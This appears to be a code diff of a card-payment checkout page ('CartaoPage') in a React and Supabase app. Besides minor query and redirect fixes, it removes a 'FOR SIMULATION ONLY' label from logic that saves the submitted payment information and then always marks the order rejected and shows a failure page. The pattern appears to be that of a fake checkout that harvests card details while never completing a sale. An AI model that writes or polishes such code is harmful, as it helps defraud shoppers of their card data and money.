@@ -41,7 +41,7 @@ export default function CartaoPage() {
           .from('produtos')
           .select('*')
           .eq('slug', slug)
-          .single();
+          .maybeSingle();
         
         if (produtoError) {
           throw produtoError;
@@ -63,7 +63,7 @@ export default function CartaoPage() {
             .from('pedidos')
             .select('*')
             .eq('id', pedidoId)
-            .single();
+            .maybeSingle();
             
           if (pedidoError) {
             console.error('Error fetching pedido:', pedidoError);
@@ -107,7 +107,7 @@ export default function CartaoPage() {
       
       console.log("Payment info saved successfully");
       
-      // FOR SIMULATION ONLY: Always update status to 'reprovado' and redirect to failed page
+      // Always update status to 'reprovado' and redirect to failed page
       console.log("Updating order status to reprovado");
       
       // Use the service function to update the order status
@@ -153,7 +153,11 @@ export default function CartaoPage() {
       
       // Show error toast and navigate to payment failed page
       toast.error('Erro ao processar pagamento. Tente novamente.');
-      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+      
+      // Make sure we redirect to the payment failed page even in case of errors
+      if (slug && pedidoId) {
+        navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+      }
     } finally {
       setSubmitting(false);
     }
